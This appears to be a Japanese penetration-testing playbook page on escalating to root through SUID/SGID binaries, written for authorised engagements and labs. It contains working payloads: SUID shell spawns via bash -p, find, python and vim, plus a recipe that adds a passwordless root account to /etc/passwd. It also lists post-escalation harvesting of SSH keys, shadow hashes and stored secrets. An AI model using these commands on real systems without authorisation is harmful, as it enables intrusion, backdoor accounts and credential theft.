# SUID / SGID バイナリによる権限昇格

> **スコープ**: SUID（Set User ID）が設定されたバイナリの検出と悪用。GTFOBins 掲載バイナリでのシェル取得〜`/etc/passwd` 書き換えまで扱う。昇格後の横展開確認は「昇格成功後に確認すること」セクションへ。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（/etc/passwd 直接編集パターンは不可逆。SUID 設定変更も痕跡が残る）
> - [ ] SIEM/EDR で確実に検知される（環境依存。auditd がある場合は SUID 変更を検知）
>
> 実施可否は事前合意で明示確認すること。`/etc/passwd` の書き換え（§5）と作成した SUID バイナリ・偽コマンドの削除（原状回復）必須。演習環境（HTB / OSCP 等）では制約なし。

## 着火条件

`find / -perm -4000 -type f 2>/dev/null` の出力に、GTFOBins に掲載されているバイナリが含まれている場合。

## 環境前提
- 実行環境: ターゲット（シェル取得済みの状態で実行）
- 必要なツール: 標準 Linux コマンド（`find` / `id` / `bash` 等）
- 外部リソース依存: GTFOBins（https://gtfobins.github.io/）の "SUID" フィルター。オフライン環境では典型ペイロードを記憶 / 事前メモで対応

## 先に確認すること

**優先度の高い SUID バイナリ（GTFOBins 掲載）:**

| バイナリ | 悪用の難易度 |
|---------|------------|
| `/bin/bash` | 非常に簡単（`-p` オプションのみ）|
| `python` / `python3` | 簡単 |
| `perl` / `ruby` | 簡単 |
| `find` | 簡単 |
| `vim` / `vi` | 簡単 |
| `nmap`（古いバージョン）| 可能 |
| `cp` / `mv` | `/etc/passwd` の書き換えで可能 |
| `wget` | `/etc/passwd` の上書きで可能 |

**非標準バイナリ（カスタムアプリケーション）にも注目**: 一般的でないパスにある SUID バイナリは、コードの脆弱性や PATH インジェクションで悪用できる可能性がある。

**攻撃者の思考トレース:** SUID が付いたバイナリは実行時にファイルの所有者（通常 root）の権限で動作する。GTFOBins で悪用方法を確認するのが最短。標準バイナリが SUID root になっているのはほぼ設定ミス。

---

## 1. SUID / SGID バイナリの検出

**コマンド:**

```bash
# [Target] SUID バイナリの検索
find / -perm -4000 -type f 2>/dev/null

# [Target] SGID バイナリの検索
find / -perm -2000 -type f 2>/dev/null

# [Target] SUID + SGID 両方
find / -perm /6000 -type f 2>/dev/null
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `bash` / `python` / `find` / `vim` 等が SUID root | GTFOBins 掲載バイナリ | §2〜§4 の該当ブロックへ |
| `cp` / `mv` / `wget` が SUID root | ファイル書き換え経由 | §5 `/etc/passwd` 書き換えへ |
| カスタムバイナリが SUID | コードの脆弱性 / PATH インジェクション | strings + GTFOBins + 手動解析 |
| SUID/SGID が標準バイナリのみ（`sudo` / `passwd` 等）| 正常な設定 | Capabilities / Sudo_Misconfig に移行 |

---

## 2. bash に SUID が設定されている場合

**コマンド:**

```bash
# [Target] -p オプションで特権モード（実効 UID を保持）でシェルを起動
/bin/bash -p
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `bash-5.x#` (root プロンプト) / `id` で `euid=0(root)` | 即 root | 「昇格成功後に確認すること」セクションへ |

**注意:** `-p` オプションなしで bash を実行すると、シェルが実効 UID をリセットしてしまう。必ず `-p` を付ける。

---

## 3. find に SUID が設定されている場合

**コマンド:**

```bash
# [Target]
find . -exec /bin/bash -p \; -quit
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| root プロンプトが返る | root 昇格成功 | 「昇格成功後に確認すること」セクションへ |

---

## 4. python / vim 等に SUID が設定されている場合

**コマンド:**

```bash
# [Target] python
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# [Target] vim
vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| root プロンプトが返る | root 昇格成功 | 「昇格成功後に確認すること」セクションへ |
| GTFOBins に掲載されていない | 別の悪用方法を探す | GTFOBins "SUID" フィルターで当該バイナリを検索 |

**GTFOBins の使い方:**
1. https://gtfobins.github.io/ にアクセス
2. バイナリ名で検索（例: `find`）
3. 「SUID」タブを選択
4. 記載されているコマンドをそのまま実行

---

## 5. cp / mv で `/etc/passwd` を書き換える場合（高インパクト）

> **[HIGH IMPACT]** `/etc/passwd` の書き換えはシステムに永続的な変更を加える操作。事前合意と原状回復が必須。

**コマンド:**

```bash
# [Target] 現在の /etc/passwd をバックアップ（必須）
cp /etc/passwd /tmp/passwd.bak

# [Target] パスワードなしの root エントリを追加
echo 'hacker::0:0:root:/root:/bin/bash' >> /tmp/passwd.bak

# [Target] SUID cp で上書き
cp /tmp/passwd.bak /etc/passwd

# [Target] 作成したアカウントでログイン
su hacker
```

**コマンド（原状回復・必須）:**

```bash
# [Target] テスト完了後に必ず元に戻す
cp /tmp/passwd.bak /etc/passwd
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `su hacker` で root プロンプトが返る | `/etc/passwd` 書き換え経由の root 昇格成功 | 「昇格成功後に確認すること」セクションへ。**作業完了後に必ず原状回復** |

**注意（原状回復）:** `/etc/passwd` を誤って書き換えると認証不能状態になる可能性あり。事前に `cp /etc/passwd /tmp/passwd.bak` でバックアップを取ること。テスト完了後は `cp /tmp/passwd.bak /etc/passwd` で必ず元に戻す。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| SUID が設定されていても昇格できない | バイナリが特権操作をしない実装 | GTFOBins で別の悪用方法を検索 |
| `-p` なしで bash を実行して UID がリセットされる | `-p` オプション必須 | 必ず `/bin/bash -p` で実行 |
| NFS マウントファイルシステムで SUID が無効 | `nosuid` オプション | 他の昇格手法（Capabilities / Sudo / Kernel Exploits）へ |

---

## 注意点・落とし穴

- SUID が設定されていても、バイナリが特権操作をしない実装であれば悪用できない場合がある
- NFS マウントされたファイルシステムでは `nosuid` オプションで SUID が無効化されることがある

> **個別ブロック固有の注意は各 §N の「注意:」を参照。**

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。特に `/etc/passwd` 直接編集パターンは認証システムの設定変更を伴うため個別承認必須
- **想定されるSIEM/EDR検知**: 環境依存（auditd の `chmod` / `setuid` 監視ルール / `AIDE` 等の整合性監視 / ファイル変更通知）
- **業務影響リスク**: サービス停止リスクは低いが、`/etc/passwd` 編集を誤ると認証不能状態になる可能性あり
- **原状回復必須項目**: ✅ `/etc/passwd` を元に戻す / ✅ SUID を新たに設定したバイナリのクリア（`chmod -s [バイナリ]`）/ ✅ 作成した偽コマンドの削除 / ✅ 追加した不正アカウントの削除
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 昇格成功後に確認すること（横展開観点）

**「SUID 経由で root になれた = ゴール」ではない。**

- `/root/.ssh/` 配下の秘密鍵 → 他ホストへの SSH 接続性の確認
- `/etc/shadow` 全エントリのハッシュ → 他システムでのパスワード使い回し検証（`hashcat` で一括クラック）
- `/root/.bash_history` → 直近の接続先・コマンド履歴
- root の cron / systemd サービスへの認証情報埋め込み
- AD 連携設定（`/etc/sssd/sssd.conf` / `/etc/krb5.conf`）→ ドメイン側資格情報
- 内部サービス（DB・管理画面・API）の設定ファイル・環境変数 → 接続情報・シークレット

---

## 関連技術

- 前：`Enumeration_Checklist.md`（`find / -perm -4000` の実行）
- 後：Capabilities も確認 → `Capabilities.md`
- 後：`/etc/shadow` を読めるようになった → ハッシュクラック: `../05_Tools_Reference/Hashcat.md`
- GTFOBins: https://gtfobins.github.io/
